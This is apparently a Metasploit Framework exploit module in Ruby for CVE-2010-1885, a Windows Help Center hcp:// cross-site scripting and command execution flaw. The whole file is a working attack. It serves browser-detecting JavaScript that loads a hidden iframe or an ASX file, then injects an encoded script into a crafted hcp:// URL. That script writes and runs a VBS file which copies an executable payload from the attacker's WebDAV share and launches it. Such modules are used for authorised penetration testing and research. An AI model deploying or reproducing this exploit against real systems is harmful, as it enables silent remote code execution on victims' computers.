##
# $Id: $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	#
	# This module acts as a HTTP server
	#
	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE
	include Msf::Exploit::CmdStagerVBS

	def initialize(info = {})
		super(update_info(info,
			'Name'			=> 'Microsoft Help Center XSS and Command Execution',
			'Description'	=> %q{
					Help and Support Center is the default application provided to access online
				documentation for Microsoft Windows. Microsoft supports accessing help documents
				directly via URLs by installing a protocol handler for the scheme "hcp". Due to
				an error in validation of input to hcp:// combined with a local cross site
				scripting vulnerability and a specialized mechanism to launch the XSS trigger,
				arbitrary command execution can be achieved.

				On IE6 and IE7 on XP SP2 or SP3, code execution is automatic. On IE8, a dialog
				box pops, but if WMP9 is installed, WMP9 can be used for automatic execution.
				If IE8 and WMP11, a dialog box will ask the user if execution should continue.
				Automatic detection of these options is implemented in this module, and will
				default to not sending the exploit for IE8/WMP11 unless the option is overridden.
			},
			'Author'		=>
				[
					'Tavis Ormandy',	# Original discovery
					'natron'			# Metasploit version
				],
			'License'		=> MSF_LICENSE,
			'Version'		=> '$Revision: $',
			'References'	=>
				[
					[ 'CVE', 'CVE-2010-1885'],
					[ 'URL', 'http://lock.cmpxchg8b.com/b10a58b75029f79b5f93f4add3ddf992/ADVISORY' ],
					#[ 'MSB', 'MS10-xxx' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'		=>
				{
					'Space'	=> 2048,
				},
			'Platform'		=> 'win',
			'Targets'		=>
				[
					[ 'Automatic',	{ } ], # Only automatic for now.
					#[ 'IE6/IE7',		{ 'trigger_method' => 'iframe'	} ], # Only tested IE7 / XP SP2,3
					#[ 'IE8/WMP9',		{ 'trigger_method' => 'asx'		} ], # untested
					#[ 'IE8/WMP11',		{ 'trigger_method' => 'asx'		} ], # tested, pops dialog box
				],
			'DisclosureDate' => 'June 09, 2010',
			'DefaultTarget'	 => 0))

			register_options(
				[
					#OptString.new(	'CMD',			 [ true, "The URI-encoded command to execute.",	"calc.exe" ]),
					OptBool.new(	'RUNWITHDIALOG', [ true, "Proceed with exploit even if it will pop a dialog to the user?", false]),
					OptPort.new(	'SRVPORT',		 [ true, "The daemon port to listen on", 80 ]),
					OptString.new(	'URIPATH',		 [ true, "The URI to use.", "/" ])
				], self.class)

			deregister_options('SSL', 'SSLVersion') # Just for now
	end

	def on_request_uri(cli, request)

		# If there is no subdirectory in the request, we need to redirect.
		if (request.uri == '/') or not (request.uri =~ /\/[^\/]+\//)
			if (request.uri == '/')
				subdir = '/' + rand_text_alphanumeric(8+rand(8)) + '/'
			else
				subdir = request.uri + '/'
			end
			print_status("Request for \"#{request.uri}\" does not contain a sub-directory, redirecting to #{subdir} ...")
			send_redirect(cli, subdir)
			return
		end


		case request.method
		when 'OPTIONS'
			process_options(cli, request)
		when 'PROPFIND'
			process_propfind(cli, request)
		when 'GET'
			process_get(cli, request)
		else
			print_error("Unexpected request method encountered: #{request.method}")
		end

	end

	def process_get(cli, request)

		#print_status("Responding to GET request from #{cli.peerhost}:#{cli.peerport}")

		@my_host   = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']

		webdav_loc = "\\\\#{@my_host}\\#{@random_dir}\\#{@payload}"

		@url_base  = "http://" + @my_host

	if request.uri.match(/#{@payload}$/i)
			print_status "GET for payload received."
			return if ((p = regenerate_payload(cli)) == nil)

			data = Msf::Util::EXE.to_win32pe(framework, p.encoded)

			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
			return
		end


		# ASX Request Inbound
		if request.uri.match(/#{@asx_file}/)
			asx = %Q|<ASX VERSION="3.0">
<PARAM name="HTMLView" value="URLBASE/STARTHELP"/>
<ENTRY>
   <REF href=""/>
</ENTRY>
</ASX>|
   #<REF href="http://www.metasploit.com/images/icbm.jpg"/>
			asx.gsub!(/URLBASE/, @url_base)
			asx.gsub!(/STARTHELP/, @random_dir + "/" + @start_help)
			print_status("ASX file requested. Responding to #{cli.peerhost}:#{cli.peerport}...")
			send_response(cli, asx, { 'Content-Type' => 'text/html' })
			return
		end

#ExpandEnvironmentStrings("%TEMP%");

		# iframe request inbound from either WMP or IE7
		if request.uri.match(/#{@start_help}/)

			help_html = %Q|
<iframe src="hcp://services/search?query=a&topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=%3Cscript%20defer%3Eeval%28unescape%28%27COMMANDS%27%29%29%3C/script%3E">|
#<iframe src="hcp://services/search?query=a&topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=%3Cscript%20defer%3Eeval%28unescape%28%27TASKKILL%27%29%29%3C/script%3E">|
			# stolen from Rex::Text, modified to return fromCharCode happy numbers

			rand_vbs	= rand_text_alpha(rand(2)+1) + ".vbs"
			task_cmd	= "taskkill /F /IM helpctr.exe"
			copy_launch = %Q^cmd /c copy #{webdav_loc} %TEMP% && %TEMP%\\#{@payload}^
			vbs_content = %Q|WScript.CreateObject("WScript.Shell").Run "#{copy_launch}",0,false|
			write_vbs	= %Q|cmd /c echo #{vbs_content}>%TEMP%\\#{rand_vbs}|
			launch_vbs  = %Q|cscript %TEMP%\\#{rand_vbs}>nul|
			concat_cmds = "#{write_vbs}|#{launch_vbs}"

			eval_block  = "Run(String.fromCharCode(#{convert_to_char_code(concat_cmds)}));"
			task_kill	= "alert(\"foo\");"#"Run(String.fromCharCode(#{convert_to_char_code(task_cmd)}));"
			eval_block = Rex::Text.uri_encode(Rex::Text.uri_encode(eval_block))
			help_html.gsub!(/COMMANDS/, eval_block)
			#help_html.gsub!(/TASKKILL/, task_kill)
			print_status("Responding to request for exploit iframe at #{cli.peerhost}:#{cli.peerport}...")
			send_response(cli, help_html, { 'Content-Type' => 'text/html' })
			return
		end

		# default initial response
		js = %Q|
		var asx = "URLBASE/ASXFILE";
		var ifr = "URLBASE/IFRFILE";

		function launchiframe(src) {
			var o = document.createElement("IFRAME");
			o.setAttribute("width","0");
			o.setAttribute("height","0");
			o.setAttribute("frameborder","0");
			o.setAttribute("src",src);
			document.body.appendChild(o);
		}

		if (window.navigator.appName == "Microsoft Internet Explorer") {
			var ua = window.navigator.userAgent;
			var re  = new RegExp("MSIE ([0-9]{1,}[\.0-9]{0,})");
			re.exec(ua)
			ver = parseFloat( RegExp.$1 );

			// if ie8, check WMP version
			if (ver > 7) {
				//alert("IE8 detected. Checking WMP version.");
				var o = document.createElement("OBJECT");
				o.setAttribute("classid", "clsid:6BF52A52-394A-11d3-B153-00C04F79FAA6");
				o.setAttribute("uiMode", "invisible");
				// if wmp9
				if( parseInt(o.versionInfo) < 10 ) {
					//alert("WMP9 or below detected. Launching exploit.");
					o.openPlayer(asx);
				// if > wmp9, but overridden via dialog
				} else {
					if( RUNWITHDIALOG ) {
						//alert(">WMP9 detected but launching anyway.");
						o.openPlayer(asx)
					} else { //alert("IE8 with > WMP9 detected. Will not launch exploit.");
					}
				}
			// if ie6 or 7, use iframe
			} else {
				//alert("< IE8 detected. Launching via iframe.")
				launchiframe(ifr);
			}
		} else {
			//alert("Non-IE detected. Launching via iframe.");
			// if other, try iframe
			var o = document.createElement("IFRAME");
			o.setAttribute("src", ifr);
			document.body.appendChild(o);
		}
|

		html = %Q|<html><head></head><body><script>JAVASCRIPTFU
</script>
</body>
</html>|

		html.gsub!(/JAVASCRIPTFU/, js)
		html.gsub!(/URLBASE/, @url_base)
		html.gsub!(/ASXFILE/, @random_dir + "/" + @asx_file)
		html.gsub!(/IFRFILE/, @random_dir + "/" + @start_help)

		datastore['RUNWITHDIALOG'] ? override = "true" : override = "false"
		html.gsub!(/RUNWITHDIALOG/, override)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
		send_response(cli, html, { 'Content-Type' => 'text/html' })
	end

	#
	# OPTIONS requests sent by the WebDav Mini-Redirector
	#
	def process_options(cli, request)
		print_status("Responding to WebDAV OPTIONS request from #{cli.peerhost}:#{cli.peerport}")
		headers = {
			#'DASL'   => '<DAV:sql>',
			#'DAV'    => '1, 2',
			'Allow'  => 'OPTIONS, GET, PROPFIND',
			'Public' => 'OPTIONS, GET, PROPFIND'
		}
		send_response(cli, '', headers)
	end

	def convert_to_char_code(str)
		return str.unpack('H*')[0].gsub(Regexp.new(".{#{2}}", nil, 'n')) { |s| s.hex.to_s + "," }.chop
	end
	#
	# PROPFIND requests sent by the WebDav Mini-Redirector
	#
	def process_propfind(cli, request)
		path = request.uri
		print_status("Received WebDAV PROPFIND request from #{cli.peerhost}:#{cli.peerport}")
		body = ''

		if (path =~ /#{@payload}$/i)
			# Response for the EXE
			print_status("Sending EXE multistatus for #{path} ...")
#<lp1:getcontentlength>45056</lp1:getcontentlength>
			body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0132-b000-43c6e5f8d2f80"</lp1:getetag>
<lp2:executable>F</lp2:executable>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|
		elsif (path =~ /\.manifest$/i) or (path =~ /\.config$/i) or (path =~ /\.exe/i)
			print_status("Sending 404 for #{path} ...")
			send_not_found(cli)
			return

		elsif (path =~ /\/$/) or (not path.sub('/', '').index('/'))
			# Response for anything else (generally just /)
			print_status("Sending directory multistatus for #{path} ...")
			body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0001-1000-4808c3ec95000"</lp1:getetag>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|

		else
			print_status("Sending 404 for #{path} ...")
			send_not_found(cli)
			return

		end

		# send the response
		resp = create_response(207, "Multi-Status")
		resp.body = body
		resp['Content-Type'] = 'text/xml'
		cli.send_response(resp)
		#print_status "DEBUG (send): \n" + resp.body
	end

	def exploit
		@random_dir = rand_text_alpha(rand(2)+1)
		@asx_file	= rand_text_alpha(rand(2)+1) + ".asx"
		@start_help	= rand_text_alpha(rand(2)+1) + ".html"
		@payload	= rand_text_alpha(rand(2)+1) + ".exe"

		if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'
			raise RuntimeError, 'Using WebDAV requires SRVPORT=80 and URIPATH=/'
		end

		super
	end
end

